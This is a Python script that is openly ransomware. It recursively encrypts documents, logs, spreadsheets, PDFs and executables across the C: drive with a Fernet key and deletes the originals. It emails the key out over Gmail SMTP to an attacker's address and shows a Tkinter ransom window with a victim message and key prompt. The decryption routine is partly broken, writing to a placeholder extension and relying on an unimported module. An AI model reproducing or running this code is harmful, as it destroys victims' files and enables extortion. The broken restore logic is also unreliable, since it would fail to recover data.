from cryptography.fernet import Fernet
import os
import smtplib
import fnmatch
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from tkinter import *
import signal
key = Fernet.generate_key()


images = ['*.txt', '*.xls', '*.exe', '*.log', '*.encrypted', '*.pdf']
encrypted = ['*.encrypted','*.xls']
matches = []
matches2 = []

for root, dirnames, filenames in os.walk("C:/"):
    for extensions in images:
        for filename in fnmatch.filter(filenames, extensions):
            matches.append(os.path.join(root, filename))


for i in range(len(matches)):
    
    try:
        with open (matches[i],'rb') as f:
                data = f.read()
                fernet = Fernet(key)
                encrypted = fernet.encrypt(data)
                with open (matches[i]+'.encrypted' ,'wb') as f:
                    f.write(encrypted)
                    print("Encrypted" + matches[i])
                   
        os.remove(matches[i])
    except:
        print("Failed Encryption")
       




#Send to email!
email = 'ENTER EMAIL HERE'
password = 'ENTER EMAIL PASSWORD HERE'
send_to_email = email
subject = 'key'
message = str(key) + "  -KEYCODE"

msg = MIMEMultipart()
msg['From'] = email
msg['To'] = send_to_email
msg['Subject'] = subject

msg.attach(MIMEText(message, 'plain'))

server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(email,password)
text = msg.as_string()
server.sendmail(email,send_to_email,text)
server.quit()


#------------------------------------------------------#
master = Tk()
Label(master,text="""

 
==.   .==
`==`o'=='
(|)
 8
Your message to the victim goes here!

""").grid(row=0)
e1 = Entry(master)


e1.grid(row=0 , column=1)

def show_entry_fields():
    global key2
    key2 = e1.get()
Button(master, text='Proveri', command=show_entry_fields).grid(row=3, column=0, sticky=W, pady=4)
Button(master,text='Nastavi', command = master.quit).grid(row=3,column=1,sticky=W,pady=4)
mainloop()
try:
    print(key2)
except:
    print("??No key found??")
    time.sleep(2)
for root, dirnames, filenames in os.walk("C:/"):
    for extensions in images:
         for filename in fnmatch.filter(filenames, extensions):
             matches2.append(os.path.join(root, filename))
for i in range(len(matches2)):
    try:
        with open (matches2[i],'rb') as f:
            data = f.read()
            fernet = Fernet(key2)
            encrypted = fernet.decrypt(data)
            with open (matches2[i] + 'replacewithextention' ,'wb') as f:
                f.write(encrypted)
    except:
        print("Failed Decryption")
        
    
